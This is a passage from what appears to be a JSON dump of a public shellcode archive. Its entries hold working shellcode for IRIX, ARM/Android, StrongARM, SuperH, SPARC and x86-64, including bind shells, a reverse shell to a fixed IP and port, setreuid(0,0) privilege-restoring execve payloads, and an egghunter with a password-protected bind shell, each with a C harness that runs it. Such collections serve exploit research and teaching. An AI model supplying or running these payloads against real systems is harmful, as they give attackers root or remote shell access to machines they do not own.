syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0x02102025,     /* or           $a0, $s0, $s0           */", "                0x24050101,     /* li           $a1, 0x0101             */", "                0x24020448,     /* li           $v0, 1096 (listen)      */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0x02102025,     /* or           $a0, $s0, $s0           */", "                0x27a5fff0,     /* addiu        $a1, $sp, -16           */", "                0x240dffef,     /* li           $t5, -17                */", "                0x01a06827,     /* nor          $t5, $t5, $zero         */", "                0xafadffec,     /* sw           $t5, -20($sp)           */", "                0x27a6ffec,     /* addiu        $a2, $sp, -20           */", "                0x24020441,     /* li           $v0, 1089 (accept)      */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "                0x3057ffff,     /* andi         $s7, $v0, 0xffff        */", "", "                0x2804ffff,     /* slti         $a0, $zero, -1          */", "                0x240203ee,     /* li           $v0, 1006 (close)       */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0x02f72025,     /* or           $a0, $s7, $s7           */", "                0x2805ffff,     /* slti         $a1, $zero, -1          */", "                0x2806ffff,     /* slti         $a2, $zero, -1          */", "                0x24020426,     /* li           $v0, 1062 (fcntl)       */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0x28040101,     /* slti         $a0, $zero, 0x0101      */", "                0x240203ee,     /* li           $v0, 1006 (close)       */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0x02f72025,     /* or           $a0, $s7, $s7           */", "                0x2805ffff,     /* slti         $a1, $zero, -1          */", "                0x28060101,     /* slti         $a2, $zero, 0x0101      */", "                0x24020426,     /* li           $v0, 1062 (fcntl)       */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350             */", "", "                0x02c02027,     /* nor          $a0, $s6, $zero         */", "                0x240203ee,     /* li           $v0, 1006 (close)       */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0x02f72025,     /* or           $a0, $s7, $s7           */", "                0x2805ffff,     /* slti         $a1, $zero, -1          */", "                0x02c03027,     /* nor          $a2, $s6, $zero         */", "                0x24020426,     /* li           $v0, 1062 (fcntl)       */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "", "                0xafa0fffc,     /* sw           $zero, -4($sp)          */", "                0x24068cb0,     /* li           $a2, -29520             */", "                0x04d0ffff,     /* bltzal       $a2, pc-4               */", "                0x8fa6fffc,     /* lw           $a2, -4($sp)            */", "                0x240fffc7,     /* li           $t7, -57                */", "                0x01e07827,     /* nor          $t7, $t7, $zero         */", "                0x03eff821,     /* addu         $ra, $ra, $t7           */", "                0x23e4fff8,     /* addi         $a0, $ra, -8            */", "                0x8fedfffc,     /* lw           $t5, -4($ra)            */", "                0x25adffbe,     /* addiu        $t5, $t5, -66           */", "                0xafedfffc,     /* sw           $t5, -4($ra)            */", "                0xafa4fff8,     /* sw           $a0, -8($sp)            */", "                0x27a5fff8,     /* addiu        $a1, $sp, -8            */", "                0x24020423,     /* li           $v0, 1059 (execve)      */", "                0x0101010c,     /* syscall                              */", "                0x240f7350,     /* li           $t7, 0x7350 (nop)       */", "                0x2f62696e,     /* .ascii       \"/bin\"                  */", "                0x2f736842,     /* .ascii       \"/sh\", .byte 0xdummy    */", "};"]},
{"Title": "IRIX - execve(/bin/sh) Shellcode (68 bytes)", "Author": "scut/teso", "Published": ": 2009-01-01", "Platform": "IRIX", "Download": "http://shell-storm.org/shellcode/files/shellcode-140.php", "View": null, "code": ["/* 68 byte MIPS/Irix PIC execve shellcode. -scut/teso", " */", "unsigned long int shellcode[] = {", "                0xafa0fffc,     /* sw           $zero, -4($sp)          */", "                0x24067350,     /* li           $a2, 0x7350             */", "/* dpatch: */   0x04d0ffff,     /* bltzal       $a2, dpatch             */", "                0x8fa6fffc,     /* lw           $a2, -4($sp)            */", "                /* a2 = (char **) envp = NULL */", "", "                0x240fffcb,     /* li           $t7, -53                */", "                0x01e07827,     /* nor          $t7, $t7, $zero         */", "                0x03eff821,     /* addu         $ra, $ra, $t7           */", "", "                /* a0 = (char *) pathname */", "                0x23e4fff8,     /* addi         $a0, $ra, -8            */", "", "                /* fix 0x42 dummy byte in pathname to shell */", "                0x8fedfffc,     /* lw           $t5, -4($ra)            */", "                0x25adffbe,     /* addiu        $t5, $t5, -66           */", "                0xafedfffc,     /* sw           $t5, -4($ra)            */", "", "                /* a1 = (char **) argv */", "                0xafa4fff8,     /* sw           $a0, -8($sp)            */", "                0x27a5fff8,     /* addiu        $a1, $sp, -8            */", "", "                0x24020423,     /* li           $v0, 1059 (SYS_execve)  */", "                0x0101010c,     /* syscall                              */", "                0x2f62696e,     /* .ascii       \"/bin\"                  */", "                0x2f736842,     /* .ascii       \"/sh\", .byte 0xdummy    */"]},
{"Title": "IRIX - stdin-read Shellcode (40 bytes)", "Author": "scut/teso", "Published": ": 2009-01-01", "Platform": "IRIX", "Download": "http://shell-storm.org/shellcode/files/shellcode-137.php", "View": null, "code": ["/* 40 byte MIPS/Irix PIC stdin-read shellcode. -scut/teso", " */", "unsigned long int shellcode[] = {", "                0x24048cb0,     /* li           $a0, -0x7350            */", "/* dpatch: */   0x0490ffff,     /* bltzal       $a0, dpatch             */", "                0x2804ffff,     /* slti         $a0, $zero, -1          */", "                0x240fffe3,     /* li           $t7, -29                */", "                0x01e07827,     /* nor          $t7, $t7, $zero         */", "                0x03ef2821,     /* addu         $a1, $ra, $t7           */", "                0x24060201,     /* li           $a2, 0x0201 (513 bytes) */", "                0x240203eb,     /* li           $v0, SYS_read           */", "                0x0101010c,     /* syscall                              */", "                0x24187350,     /* li           $t8, 0x7350 (nop)       */", "};"]},
{"Title": "Android/ARM - Reverse (10.0.2.2:0x3412/TCP) Shell (/system/bin/sh) Shellcode (79 bytes)", "Author": "Neil Klopfenstein", "Published": ": 2009-01-01", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-754.php", "View": null, "code": ["/* This ARM Thumb sc connects to a given IP and port with a shell.", " * Intended for use with Android (hence /system/bin/sh).", " *", " * Connects to the provided IP and port with a shell", " *", " * no null bytes in the code, but does this really matter these days?", " * it could be fixed with just a few instructions.", " *", " * Released to the public domain */", "", "#include <stdio.h>", "#include <string.h>", "", "#define SWAP16(x)\t((x) << 8 | ((x) >> 8))", "", "const unsigned char sc[] = {", "\t/* Enter Thumb mode (for proof of concept) */", "\t0x01, 0x10, 0x8F, 0xE2, 0x11, 0xFF, 0x2F, 0xE1,", "", "\t/* 16-bit instructions follow */", "\t0x02, 0x20, 0x01, 0x21, 0x92, 0x1A, 0x0F, 0x02, 0x19, 0x37, 0x01,", "\t0xDF, 0x06, 0x1C, 0x08, 0xA1, 0x10, 0x22, 0x02, 0x37, 0x01, 0xDF,", "\t0x3F, 0x27, 0x02, 0x21, 0x30, 0x1c, 0x01, 0xdf, 0x01, 0x39, 0xFB,", "\t0xD5, 0x05, 0xA0, 0x92, 0x1a, 0x05, 0xb4, 0x69, 0x46, 0x0b, 0x27,", "\t0x01, 0xDF, 0xC0, 0x46,", "", "\t/* struct sockaddr */", "\t0x02, 0x00,", "\t/* port: 0x1234 */", "\t0x12, 0x34,", "\t/* ip: 10.0.2.2 */", "\t0x0A, 0x00, 0x02, 0x02,", "", "\t/* \"/system/bin/sh\" */", "\t0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e,", "\t0x2f, 0x73, 0x68, 0x00", "};", "", "int main()", "{", "\tprintf(\"shellcode=%d bytes\\n\"", "\t       \"connecting to %d.%d.%d.%d:%hd\\n\", sizeof sc,", "\t\tsc[0x3c], sc[0x3d], sc[0x3e], sc[0x3f],", "\t\tSWAP16(*((unsigned short *)(sc+0x3a))));", "\treturn ((int (*)(void))sc)();", "}", "", "/*", " * Assembly for those who are interested ", " *", "", "# switch to Thumb mode (16-bit ops) ", "        .code 32", "        add     r1, pc, #1", "        bx      r1", "", "# Thumb instructions follow", "        .code 16", "", "# socket(2, 1, 0)", "        mov     r0, #2", "        mov     r1, #1", "        sub     r2, r2, r2", "        lsl     r7, r1, #8", "        add     r7, r7, #25", "        svc     1", "", "# connect(r0, &addr, 16)", "        mov     r6, r0", "        add     r1, pc, #32", "        mov     r2, #16", "        add     r7, #2", "        svc     1", "", "# dup2(r0, 0/1/2)", "        mov     r7, #63", "        mov     r1, #2", "Lb:", "        mov     r0, r6", "        svc     1", "        sub     r1, #1", "        bpl     Lb", "", "# execve(\"/system/bin/sh\", [\"/system/bin/sh\", 0], 0) ", "        add     r0, pc, #20", "        sub     r2, r2, r2", "        push    {r0, r2}", "        mov     r1, sp", "        mov     r7, #11", "        svc     1", "", "# struct sockaddr ", ".align 2", ".short 0x2", ".short 0x3412\t# port\t", ".byte 10,0,2,2\t# IP", ".ascii \"/system/bin/sh\\0\\0\"\t# shell", "", "***/"]},
{"Title": "Linux/StrongARM - setuid() Shellcode (20 bytes)", "Author": "funkysh", "Published": ": 2009-01-01", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-660.php", "View": null, "code": ["/*", " * 20 byte StrongARM/Linux setuid() shellcode", " * funkysh", " */", "", "char shellcode[]= \"\\x02\\x20\\x42\\xe0\"   /*  sub   r2, r2, r2            */", "                  \"\\x04\\x10\\x8f\\xe2\"   /*  add   r1, pc, #4            */", "                  \"\\x12\\x02\\xa0\\xe1\"   /*  mov   r0, r2, lsl r2        */", "                  \"\\x01\\x20\\xc1\\xe5\"   /*  strb  r2, [r1, #1]          */", "                  \"\\x17\\x0b\\x90\\xef\";  /*  swi   0x90ff17              */"]},
{"Title": "Linux/StrongARM - execve(/bin/sh) Shellcode (47 bytes)", "Author": "funkysh", "Published": ": 2009-01-01", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-659.php", "View": null, "code": ["/*", " * 47 byte StrongARM/Linux execve() shellcode", " * funkysh", " */", "", "char shellcode[]= \"\\x02\\x20\\x42\\xe0\"   /*  sub   r2, r2, r2            */", "                  \"\\x1c\\x30\\x8f\\xe2\"   /*  add   r3, pc, #28 (0x1c)    */", "                  \"\\x04\\x30\\x8d\\xe5\"   /*  str   r3, [sp, #4]          */", "                  \"\\x08\\x20\\x8d\\xe5\"   /*  str   r2, [sp, #8]          */", "                  \"\\x13\\x02\\xa0\\xe1\"   /*  mov   r0, r3, lsl r2        */", "                  \"\\x07\\x20\\xc3\\xe5\"   /*  strb  r2, [r3, #7           */", "                  \"\\x04\\x30\\x8f\\xe2\"   /*  add   r3, pc, #4            */", "                  \"\\x04\\x10\\x8d\\xe2\"   /*  add   r1, sp, #4            */", "                  \"\\x01\\x20\\xc3\\xe5\"   /*  strb  r2, [r3, #1]          */", "                  \"\\x0b\\x0b\\x90\\xef\"   /*  swi   0x90ff0b              */", "                  \"/bin/sh\";"]},
{"Title": "Linux/StrongARM - Bind (/TCP) Shell (/bin/sh) Shellcode (203 bytes)", "Author": "funkysh", "Published": ": 2009-01-01", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-661.php", "View": null, "code": ["/*", " * 203 byte StrongARM/Linux bind() portshell shellcode", " * funkysh", " */", "", "char shellcode[]= \"\\x20\\x60\\x8f\\xe2\"   /*  add   r6, pc, #32           */", "                  \"\\x07\\x70\\x47\\xe0\"   /*  sub   r7, r7, r7            */", "                  \"\\x01\\x70\\xc6\\xe5\"   /*  strb  r7, [r6, #1]          */", "                  \"\\x01\\x30\\x87\\xe2\"   /*  add   r3, r7, #1            */", "                  \"\\x13\\x07\\xa0\\xe1\"   /*  mov   r0, r3, lsl r7        */", "                  \"\\x01\\x20\\x83\\xe2\"   /*  add   r2, r3, #1            */", "                  \"\\x07\\x40\\xa0\\xe1\"   /*  mov   r4, r7                */", "                  \"\\x0e\\xe0\\x4e\\xe0\"   /*  sub   lr, lr, lr            */", "                  \"\\x1c\\x40\\x2d\\xe9\"   /*  stmfd sp!, {r2-r4, lr}      */", "                  \"\\x0d\\x10\\xa0\\xe1\"   /*  mov   r1, sp                */", "                  \"\\x66\\xff\\x90\\xef\"   /*  swi   0x90ff66     (socket) */", "                  \"\\x10\\x57\\xa0\\xe1\"   /*  mov   r5, r0, lsl r7        */", "                  \"\\x35\\x70\\xc6\\xe5\"   /*  strb  r7, [r6, #53]         */", "                  \"\\x14\\x20\\xa0\\xe3\"   /*  mov   r2, #20               */", "                  \"\\x82\\x28\\xa9\\xe1\"   /*  mov   r2, r2, lsl #17       */", "                  \"\\x02\\x20\\x82\\xe2\"   /*  add   r2, r2, #2            */", "                  \"\\x14\\x40\\x2d\\xe9\"   /*  stmfd sp!, {r2,r4, lr}      */", "                  \"\\x10\\x30\\xa0\\xe3\"   /*  mov   r3, #16               */", "                  \"\\x0d\\x20\\xa0\\xe1\"   /*  mov   r2, sp                */", "                  \"\\x0d\\x40\\x2d\\xe9\"   /*  stmfd sp!, {r0, r2, r3, lr} */", "                  \"\\x02\\x20\\xa0\\xe3\"   /*  mov   r2, #2                */", "                  \"\\x12\\x07\\xa0\\xe1\"   /*  mov   r0, r2, lsl r7        */", "                  \"\\x0d\\x10\\xa0\\xe1\"   /*  mov   r1, sp                */", "                  \"\\x66\\xff\\x90\\xef\"   /*  swi   0x90ff66       (bind) */", "                  \"\\x45\\x70\\xc6\\xe5\"   /*  strb  r7, [r6, #69]         */", "                  \"\\x02\\x20\\x82\\xe2\"   /*  add   r2, r2, #2            */", "                  \"\\x12\\x07\\xa0\\xe1\"   /*  mov   r0, r2, lsl r7        */", "                  \"\\x66\\xff\\x90\\xef\"   /*  swi   0x90ff66     (listen) */", "                  \"\\x5d\\x70\\xc6\\xe5\"   /*  strb  r7, [r6, #93]         */", "                  \"\\x01\\x20\\x82\\xe2\"   /*  add   r2, r2, #1            */", "                  \"\\x12\\x07\\xa0\\xe1\"   /*  mov   r0, r2, lsl r7        */", "                  \"\\x04\\x70\\x8d\\xe5\"   /*  str   r7, [sp, #4]          */", "                  \"\\x08\\x70\\x8d\\xe5\"   /*  str\t r7, [sp, #8]          */", "                  \"\\x66\\xff\\x90\\xef\"   /*  swi   0x90ff66     (accept) */", "                  \"\\x10\\x57\\xa0\\xe1\"   /*  mov   r5, r0, lsl r7        */", "                  \"\\x02\\x10\\xa0\\xe3\"   /*  mov   r1, #2                */", "                  \"\\x71\\x70\\xc6\\xe5\"   /*  strb  r7, [r6, #113]        */", "                  \"\\x15\\x07\\xa0\\xe1\"   /*  mov   r0, r5, lsl r7 <dup2> */", "                  \"\\x3f\\xff\\x90\\xef\"   /*  swi   0x90ff3f       (dup2) */", "                  \"\\x01\\x10\\x51\\xe2\"   /*  subs  r1, r1, #1            */", "                  \"\\xfb\\xff\\xff\\x5a\"   /*  bpl   <dup2>                */", "                  \"\\x99\\x70\\xc6\\xe5\"   /*  strb  r7, [r6, #153]        */", "                  \"\\x14\\x30\\x8f\\xe2\"   /*  add   r3, pc, #20           */", "                  \"\\x04\\x30\\x8d\\xe5\"   /*  str\t r3, [sp, #4]          */", "                  \"\\x04\\x10\\x8d\\xe2\"   /*  add   r1, sp, #4            */", "                  \"\\x02\\x20\\x42\\xe0\"   /*  sub   r2, r2, r2            */", "                  \"\\x13\\x02\\xa0\\xe1\"   /*  mov   r0, r3, lsl r2        */", "                  \"\\x08\\x20\\x8d\\xe5\"   /*  str   r2, [sp, #8]          */", "                  \"\\x0b\\xff\\x90\\xef\"   /*  swi\t 0x900ff0b    (execve) */", "                  \"/bin/sh\";"]},
{"Title": "Linux/SuperH (sh4) - Bind (31337/TCP) Shell (/bin/sh) Shellcode (132 bytes)", "Author": "Dad`", "Published": ": 2009-01-01", "Platform": "SuperH_SH4", "Download": "http://shell-storm.org/shellcode/files/shellcode-774.php", "View": null, "code": ["/*", " * Bind /bin/sh on port 31337", " * SH4 - 132bytes", " * Dad`", "main:", "\tmov     #102,r3", "\tmov     #2,r4", "\tmov     #1,r5", "\txor     r6,r6", "\tmov.l   r6,@-r15", "\tmov.l   r5,@-r15", "\tmov.l   r4,@-r15", "\tmov     #1,r4", "\tmov     r15,r5", "\ttrapa   #19", "\tmov     r0,r4", "\tmov     r0,r8", "\txor     r2,r2", "\tmov.l   r2,@-r15", "\tmov     #105,r2", "\tmov.b   r2,@-r15", "\tmov     #122,r2", "\tmov.b   r2,@-r15", "\txor     r2,r2", "\tmov.b   r2,@-r15", "\tmov     #2,r2", "\tmov.b   r2,@-r15", "\tmov     r15,r5", "\tmov     #16,r6", "\tmov.l   r6,@-r15", "\tmov.l   r5,@-r15", "\tmov.l   r4,@-r15", "\tmov     #2,r4", "\tmov     r15,r5", "\ttrapa   #19", "\tmov     r8,r4", "\txor     r5,r5", "\txor     r6,r6", "\tmov.l   r6,@-r15", "\tmov.l   r5,@-r15", "\tmov.l   r4,@-r15", "\tmov     #4,r4", "\tmov     r15,r5", "\ttrapa   #19", "\tmov     r8,r4", "\txor     r5,r5", "\txor     r6,r6", "\tmov.l   r6,@-r15", "\tmov.l   r5,@-r15", "\tmov.l   r4,@-r15", "\tmov     #5,r4", "\tmov     r15,r5", "\ttrapa   #19", "\tmov     r0,r9", "\tmov     #3,r10", "dup:", "\tadd     #-1,r10", "\tmov     #63,r3", "\tmov     r9,r4", "\tmov     r10,r5", "\ttrapa   #19", "\tcmp/pl  r10", "\tbt      dup", "\tmov     #11,r3", "\tmova    @(8,pc),r0", "\tmov     r0,r4", "\txor     r5,r5", "\ttrapa   #19", "\t.string \"///bin/sh\"", " */", "#include <stdio.h>", "#include <string.h>", "", "char code[] = \"\\x66\\xe3\\x02\\xe4\\x01\\xe5\\x6a\\x26\\x66\\x2f\\x56\\x2f\\x46\\x2f\\x01\\xe4\\xf3\\x65\\x13\\xc3\\x03\\x64\\x03\\x68\\x2a\\x22\\x26\\x2f\\x69\\xe2\\x24\\x2f\\x7a\\xe2\\x24\\x2f\\x2a\\x22\\x24\\x2f\\x02\\xe2\\x24\\x2f\\xf3\\x65\\x10\\xe6\\x66\\x2f\\x56\\x2f\\x46\\x2f\\x02\\xe4\\xf3\\x65\\x13\\xc3\\x83\\x64\\x5a\\x25\\x6a\\x26\\x66\\x2f\\x56\\x2f\\x46\\x2f\\x04\\xe4\\xf3\\x65\\x13\\xc3\\x83\\x64\\x5a\\x25\\x6a\\x26\\x66\\x2f\\x56\\x2f\\x46\\x2f\\x05\\xe4\\xf3\\x65\\x13\\xc3\\x03\\x69\\x03\\xea\\xff\\x7a\\x3f\\xe3\\x93\\x64\\xa3\\x65\\x13\\xc3\\x15\\x4a\\xf8\\x89\\x0b\\xe3\\x01\\xc7\\x03\\x64\\x5a\\x25\\x13\\xc3\\x2f\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\";", "", "int main()", "{", "    printf(\"len:%d bytes\\n\", strlen(code));", "    (*(void(*)()) code)();", "    return 0;", "}"]},
{"Title": "Linux/SPARC - setreuid(0,0) + execve(/bin/sh) Shellcode (64 bytes)", "Author": "anathema", "Published": ": 2009-01-01", "Platform": "Linux_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-83.php", "View": null, "code": ["/*", " *  Linux/SPARC [setreuid(0,0); execve() of /bin/sh] shellcode.", " */  ", "", "char c0de[] = /* anathema < anathema@hack.co.za > */", "/* setreuid(0,0); */", "\"\\x82\\x10\\x20\\x7e\"   /* mov 126, %g1               */", "\"\\x92\\x22\\x40\\x09\"   /* sub %o1, %o1, %o1          */", "\"\\x90\\x0a\\x40\\x09\"   /* and %o1, %o1, %o0          */", "\"\\x91\\xd0\\x20\\x10\"   /* ta 0x10                    */", "", "/* execve() of /bin/sh */", "\"\\x2d\\x0b\\xd8\\x9a\"   /* sethi %hi(0x2f626800), %l6 */", "\"\\xac\\x15\\xa1\\x6e\"   /* or %l6, 0x16e, %l6         */", "\"\\x2f\\x0b\\xdc\\xda\"   /* sethi %hi(0x2f736800), %l7 */", "\"\\x90\\x0b\\x80\\x0e\"   /* and %sp, %sp, %o0          */", "\"\\x92\\x03\\xa0\\x08\"   /* add %sp, 0x08, %o1         */", "\"\\x94\\x22\\x80\\x0a\"   /* sub %o2, %o2, %o2          */", "\"\\x9c\\x03\\xa0\\x10\"   /* add %sp, 0x10, %sp         */", "\"\\xec\\x3b\\xbf\\xf0\"   /* std %l6, [ %sp + - 16 ]    */", "\"\\xd0\\x23\\xbf\\xf8\"   /* st %o0, [ %sp + - 8 ]      */", "\"\\xc0\\x23\\xbf\\xfc\"   /* clr [ %sp + -4 ]           */", "\"\\x82\\x10\\x20\\x3b\"   /* mov 0x3b, %g1              */", "\"\\x91\\xd0\\x20\\x10\"   /* ta 0x10                    */", ";", "", "/*", " *  Test out the shellcode.", " */ ", "main ()", "{", "    void (*sc)() = (void *)c0de;", "    sc();", "}", "", "/* EOF */"]},
{"Title": "Linux/SPARC - setreuid(0,0) + execve() Shellcode (72 bytes)", "Author": "Michel Kaempf", "Published": ": 2009-01-01", "Platform": "Linux_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-82.php", "View": null, "code": ["/*", " *  Linux/SPARC", " *", " *  setreuid(0, 0); (necessary, /bin/sh drops privs), standard execve().", " */", "", "char c0de[] = /* by michel kaempf */", "", "  /* setuid( 0 ); */", "  \"\\x90\\x1a\\x40\\x09\\x82\\x10\\x20\\x17\\x91\\xd0\\x20\\x10\"", "  /* setgid( 0 ); */", "  \"\\x90\\x1a\\x40\\x09\\x82\\x10\\x20\\x2e\\x91\\xd0\\x20\\x10\"", "  /* Aleph One :) */", "  \"\\x2d\\x0b\\xd8\\x9a\\xac\\x15\\xa1\\x6e\\x2f\\x0b\\xdc\\xda\\x90\\x0b\\x80\\x0e\"", "  \"\\x92\\x03\\xa0\\x08\\x94\\x1a\\x80\\x0a\\x9c\\x03\\xa0\\x10\\xec\\x3b\\xbf\\xf0\"", "  \"\\xd0\\x23\\xbf\\xf8\\xc0\\x23\\xbf\\xfc\\x82\\x10\\x20\\x3b\\x91\\xd0\\x20\\x10\";"]},
{"Title": "Linux/x64 - Execute /bin/sh Shellcode (27 bytes)", "Author": "Dad`", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-806.php", "View": null, "code": ["/*", " * Execute /bin/sh - 27 bytes", " * Dad` <3 baboon", ";rdi            0x4005c4 0x4005c4", ";rsi            0x7fffffffdf40   0x7fffffffdf40", ";rdx            0x0      0x0", ";gdb$ x/s $rdi", ";0x4005c4:        \"/bin/sh\"", ";gdb$ x/s $rsi", ";0x7fffffffdf40:  \"\\304\\005@\"", ";gdb$ x/32xb $rsi", ";0x7fffffffdf40: 0xc4    0x05    0x40    0x00    0x00    0x00    0x00    0x00", ";0x7fffffffdf48: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00", ";0x7fffffffdf50: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00", ";0x7fffffffdf58: 0x55    0xb4    0xa5    0xf7    0xff    0x7f    0x00    0x00", ";", ";=> 0x7ffff7aeff20 <execve>:     mov    eax,0x3b", ";   0x7ffff7aeff25 <execve+5>:   syscall ", ";", "", "main:", "    ;mov rbx, 0x68732f6e69622f2f", "    ;mov rbx, 0x68732f6e69622fff", "    ;shr rbx, 0x8", "    ;mov rax, 0xdeadbeefcafe1dea", "    ;mov rbx, 0xdeadbeefcafe1dea", "    ;mov rcx, 0xdeadbeefcafe1dea", "    ;mov rdx, 0xdeadbeefcafe1dea", "    xor eax, eax", "    mov rbx, 0xFF978CD091969DD1", "    neg rbx", "    push rbx", "    ;mov rdi, rsp", "    push rsp", "    pop rdi", "    cdq", "    push rdx", "    push rdi", "    ;mov rsi, rsp", "    push rsp", "    pop rsi", "    mov al, 0x3b", "    syscall", " */", "", "#include <stdio.h>", "#include <string.h>", "", "char code[] = \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\";", "", "int main()", "{", "    printf(\"len:%d bytes\\n\", strlen(code));", "    (*(void(*)()) code)();", "    return 0;", "}"]},
{"Title": "Linux/x64 - Bind (1337/TCP) Shell + Password (pAzzW0rd) + Egghunter Using sys_access() Shellcode (49 bytes)", "Author": "Doreth.Z10", "Published": ": 2009-01-01", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-894.php", "View": null, "code": ["; Author Doreth.Z10", ";", "; Linux x86_64 Egghunter using sys_access()", "; Shellcode size 49 bytes", ";", "", "global _start", "", "section .text", "", "_start:", "", "    xor rsi, rsi        ; Some prep junk.", "    push rsi", "    pop rdx", "    push 8", "    pop rbx", "", "go_end_of_page:", "    or dx, 0xfff        ; We align with a page size of 0x1000", "        ", "next_byte:", "", "    inc rdx             ; next byte offset", "    push 21         ", "    pop rax             ; We load access() in RAX", "    push rdx", "    pop rdi", "    add rdi, rbx        ; We need to be sure our 8 byte egg check does not span across 2 pages", "    syscall             ; syscall to access()", "", "    cmp al, 0xf2        ; Checks for EFAULT.  EFAULT indicates bad page access.", " ", "    jz go_end_of_page   ; if EFAULT, try next page", "", "    ; --", "    ; Put your won egg here !", "", "    mov eax, 0xBEBDBEBD ; Egg contruction so we dont catch ourself !", "    not eax             ; Important, EGG must contain NOP like instruction bytecode.", "    ", "    ; --", "    mov rdi, rdx", "    scasd", "    jnz next_byte       ; if egg does not match, try next byte", "    cmp eax, [rdi]", "    jnz next_byte       ; if egg does not match, try next byte", "", "    jmp rdi             ; Good, found egg. Jump !", "                        ; Important, EGG must contain NOP like instruction bytecode.", "", "", "", ";", "; Egghunter demonstration", ";", "; bindshell is pushed in the heap using a malloc() call and pre-pended with the egg. Then egghunter is fired.", ";", "; Depending on size of the malloc() call, binshell can be anywhere in the address space.", "; For a big malloc() size like 1 000 000 bytes, it will be placed far in the address space.", "; A malloc(1000000) was tested on a Unbuntu system with Inter Core i7 and it took over 9 hrs for the egghunter", "; to find the egg. ", ";", "; Enjoy.", "", "", "", "#include <stdio.h>", "#include <stdlib.h>", "#include <string.h>", "", "unsigned char egg[] = ", "\"YOUR EGG HERE 4 bytes\";", "", "// In this example we use a password protected binshell on port 1337: pAzzW0rd ", "unsigned char bindshell[] = ", "\"\\xeb\\x09\\x48\\x31\\xff\\x48\\xf7\\xe7\\x57\\x5e\\xc3\\x55\\x48\\x89\\xe5\\xe8\\xee\\xff\\xff\\xff\\x04\\x29\\x40\\x80\\xc7\\x02\\xff\\xc6\\x0f\\x05\\x50\\xe8\\xde\\xff\\xff\\xff\\x04\\x31\\x48\\x8b\\x3c\\x24\\x56\\x81\\xc6\\x03\\x01\\x05\\x39\\x66\\x81\\xee\\x01\\x01\\x56\\x48\\x89\\xe6\\x80\\xc2\\x10\\x0f\\x05\\xe8\\xbe\\xff\\xff\\xff\\x04\\x32\\x48\\x8b\\x7d\\xf8\\x0f\\x05\\xe8\\xb1\\xff\\xff\\xff\\x04\\x2b\\x48\\x8b\\x7d\\xf8\\x48\\x89\\xe6\\x80\\xc2\\x18\\x52\\x48\\x89\\xe2\\x0f\\x05\\x49\\x89\\xc0\\xe8\\x97\\xff\\xff\\xff\\x4c\\x89\\xc7\\x40\\x80\\xec\\x18\\x48\\x89\\xe6\\x80\\xc2\\x18\\x0f\\x05\\x48\\xb8\\x70\\x41\\x7a\\x7a\\x57\\x30\\x72\\x64\\x48\\x89\\xe7\\x48\\xaf\\x75\\x42\\x48\\x31\\xc0\\x4c\\x89\\xc7\\x48\\x31\\xf6\\x40\\x80\\xc6\\x02\\x04\\x21\\x0f\\x05\\x48\\x31\\xc0\\x04\\x21\\x48\\xff\\xce\\x75\\xf4\\x0f\\x05\\xe8\\x55\\xff\\xff\\xff\\x50\\x04\\x3b\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41\\x50\\x48\\x89\\xe7\\x52\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x89\\xec\\x5d\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\";", "", "unsigned char egghunter[] = ", "\"\\x48\\x31\\xf6\\x56\\x5a\\x6a\\x08\\x5b\\x66\\x81\\xca\\xff\\x0f\\x48\\xff\\xc2\\x6a\\x15\\x58\\x52\\x5f\\x48\\x01\\xdf\\x0f\\x05\\x3c\\xf2\\x74\\xea\\xb8\\xbd\\xbe\\xbd\\xbe\\xf7\\xd0\\x48\\x89\\xd7\\xaf\\x75\\xe2\\x3b\\x07\\x75\\xde\\xff\\xe7\";", "", "", "", "main()", "{", "", "    char *heap = (char*)malloc(1000000);", "    memset(heap, '\\0', 512);", "    strncpy(heap, egg, 4);", "    strncpy(heap+4, egg, 4);", "    strncpy(heap+8, bindshell, 212);", "", "    printf(\"Egghunter Length: %d\\n\", strlen(egghunter));", "    printf(\"Shellcode Length: %d\\n\", strlen(bindshell));", "        int (*ret)() = (int(*)())egghunter;", "        ret();", "    return 0;", "}"]},
